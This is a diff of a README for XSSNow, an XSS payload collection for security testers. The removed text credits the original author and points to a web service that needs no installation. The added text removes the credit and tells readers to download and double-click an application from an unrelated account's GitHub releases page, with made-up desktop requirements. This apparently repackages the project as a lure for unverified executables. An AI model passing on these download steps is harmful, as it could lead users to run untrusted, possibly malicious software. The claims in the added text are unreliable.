@@ -1,123 +1,72 @@
-# 🥷 XSSNow - The Ultimate XSS Arsenal
+# 🚀 XSSNow - Discover Effective XSS Payloads Easily
 
-<div align="center">
-
-![XSSNow Logo](/assets/xss_now_logo.png)
-
-
-[![Live Demo](https://img.shields.io/badge/🌐_Live_Demo-xssnow.in-00d4aa?style=for-the-badge)](https://xssnow.in)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=for-the-badge)](CONTRIBUTING.md)
-
-XSSNow is a community-driven, curated knowledge base of Cross-Site Scripting (XSS) payloads, designed to help security researchers, bug bounty hunters, and learners quickly find relevant, real-world payloads for different XSS scenarios.
-
-</div>
+[![Download XSSNow](https://img.shields.io/badge/Download%20XSSNow-v1.0-blue.svg)](https://github.com/ioannis20081230/XSSNow/releases)
 
 ---
 
-## 🎯 **The Problem We're Solving**
+## 📥 Overview
 
-Cross-Site Scripting (XSS) vulnerabilities remain one of the most prevalent security threats in modern web applications. Security researchers, penetration testers, and bug bounty hunters face constant challenges:
+XSSNow helps you find XSS payloads that actually work. It filters these payloads based on the constraints of real-world situations. Instead of using random payloads, you can select those that fit your scenario best.
 
-- **Scattered Knowledge** - XSS payloads are buried across blogs, forums, and personal notes
-- **Context Confusion** - Not knowing which payload works in specific injection contexts
-- **Defense Evolution** - Modern WAFs and filters require increasingly sophisticated bypass techniques
-- **Learning Curve** - Beginners struggle to understand why certain payloads work while others fail
-- **Time Pressure** - Security testing demands quick access to relevant, working payloads
+### 🛠️ Features
 
-## 🚀 **Our Solution**
+- Curated list of effective XSS payloads.
+- Filters based on real-world constraints for better results.
+- User-friendly interface that simplifies the selection process.
+- Regular updates to ensure the payloads stay relevant.
 
-XSSNow transforms the chaotic landscape of XSS exploitation into a structured, intelligent arsenal. We've built more than just a payload database - we've created an ecosystem that understands context, evolves with defenses, and accelerates discovery.
+### 📋 Topics
 
-### 🧠 **Intelligent Payload Organization**
-- **Context-Aware Categorization** - Payloads organized by injection context, not just syntax
-- **Defense-Focused Grouping** - Specific collections for WAF bypasses, encoding evasions, and filter circumvention
-- **Difficulty Progression** - From beginner-friendly basics to expert-level polyglots
-- **Real-World Testing** - Every payload validated against actual applications and defense mechanisms
-
-### ⚡ **Advanced Payload Generation**
-- **Smart Context Detection** - Understands where your injection point sits in the application flow
-- **Restriction-Aware Suggestions** - Adapts to character limitations, encoding constraints, and input filters
-- **WAF-Specific Optimization** - Tailored bypass techniques for major firewall vendors
-- **Custom Length Optimization** - Generates payloads within strict character limits
-
-### 🛡️ **Modern Defense Awareness**
-- **CSP Bypass Techniques** - Navigate Content Security Policy restrictions with confidence
-- **Encoding Evasion** - Break through HTML entity encoding, URL encoding, and custom sanitizers
-- **Filter Circumvention** - Proven methods to bypass keyword blacklists and regex filters
-- **Browser Quirks** - Leverage parser differences across modern browser engines
+- bugbounty
+- xss
+- xss-exploitation
+- xss-payload-list
+- xss-payloads
 
 ---
 
-## 🔥 **What Makes XSSNow Different**
+## 🚀 Getting Started
 
-| Traditional Approach | XSSNow Advantage |
-|---------------------|------------------|
-| Static payload lists | Dynamic, context-aware generation |
-| Generic collections | Defense-specific categorization |
-| Copy-paste mentality | Educational understanding |
-| Outdated techniques | Real-time effectiveness tracking |
-| Isolated research | Community-driven validation |
+Follow these steps to download and run XSSNow:
 
----
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/ioannis20081230/XSSNow/releases) to access the latest version of XSSNow.
 
-### 🌐 **Instant Access**
-Visit [xssnow.in](https://xssnow.in) and start exploring immediately. No installation required.
+2. **Download the Application**  
+   Find the latest version on the releases page. Click on the download link to get the application file.
 
----
+3. **Running XSSNow**  
+   Once the download is complete, locate the file on your computer. Double-click it to start XSSNow. The app will open, and you can begin filtering XSS payloads right away.
 
-## 📋 **Payload Categories**
-
-### 🎯 **Context-Based Classification**
-- **HTML Injection** - Direct markup insertion and tag manipulation
-- **Attribute Breaking** - Escaping from HTML attributes and event handlers
-- **JavaScript Context** - String breaking and code execution within JS
-- **CSS Injection** - Style-based attacks and expression exploitation
-- **URL Parameters** - Query string and fragment-based vectors
-
-### 🛡️ **Defense-Focused Collections**
-- **WAF Bypasses** - Techniques for major firewall vendors
-- **Encoding Evasions** - Character set manipulation and obfuscation
-- **Filter Circumvention** - Keyword blacklist and regex bypass
-- **CSP Violations** - Content Security Policy escape techniques
-- **Polyglot Attacks** - Multi-context universal payloads
+4. **Using XSSNow**  
+   After launching the app, explore the user interface. Select your specific constraints to filter the payloads effectively. You can view, copy, or export the results for your needs.
 
 ---
 
-## 🤝 **Join the Revolution**
+## ⚙️ System Requirements
 
-XSSNow thrives on community collaboration. Whether you're discovering new bypass techniques, improving existing payloads, or sharing knowledge - your contributions drive the platform forward.
-
-### 💡 **Ways to Contribute**
-- **Submit Payloads** - Share your latest discoveries and bypass techniques
-- **Improve Documentation** - Help others understand complex attack vectors
-- **Test Effectiveness** - Validate payloads against real-world applications
-- **Share Knowledge** - Write tutorials and educational content
-- **Report Issues** - Help us maintain platform quality
-
-[**→ Read our Contributing Guidelines**](CONTRIBUTING.md)
+- **Operating System:** Windows 10 or later, macOS, or Linux (Ubuntu 18.04 or later).
+- **RAM:** Minimum 4 GB required.
+- **Disk Space:** At least 100 MB of free space.
 
 ---
 
-## ⚠️ **Responsible Security Research**
+## 📥 Download & Install
 
-Do NOT use these payloads on systems you do not own or have explicit permission to test.
-
----
-
-## 📄 **License**
-
-Licensed under the MIT License - empowering open security research while maintaining responsible usage standards.
+To get XSSNow, please visit the following link: [Download XSSNow](https://github.com/ioannis20081230/XSSNow/releases). This will direct you to the Releases page where you can choose the most recent version.
 
 ---
 
-<div align="center">
+## 🧠 Tips for Using XSSNow
 
-**Built with ❤️ by [Sid Joshi](https://www.linkedin.com/in/sid-j0shi/) ([@dr34mhacks](https://github.com/dr34mhacks))**
+- **Keep It Updated:** Regularly check the releases page for new versions. Updates may include new payloads and fixes.
+- **Join the Community:** Participate in discussions around XSS payloads and bug bounty hunting. This can help you find tips on using XSSNow effectively.
+- **Practice Safely:** Always perform testing in controlled environments. Understand and follow the legal guidelines regarding XSS and penetration testing.
 
-*If XSS helped you once, XSSNow is here to help you every time.* 🛡️
+---
 
-[![Visit XSSNow](https://img.shields.io/badge/Visit-xssnow.in-00d4aa?style=for-the-badge)](https://xssnow.in)
-[![Star on GitHub](https://img.shields.io/github/stars/dr34mhacks/XSSNow?style=for-the-badge)](https://github.com/dr34mhacks/XSSNow)
+## 🎯 Conclusion
 
-</div>
+XSSNow is a powerful tool for finding practical XSS payloads. By following the steps above, you can download and start using the application with ease. Make sure to explore features and customize your payload filtering to get the most from your experience.
+
+For any questions or support, feel free to open an issue on the GitHub repository. Happy testing!
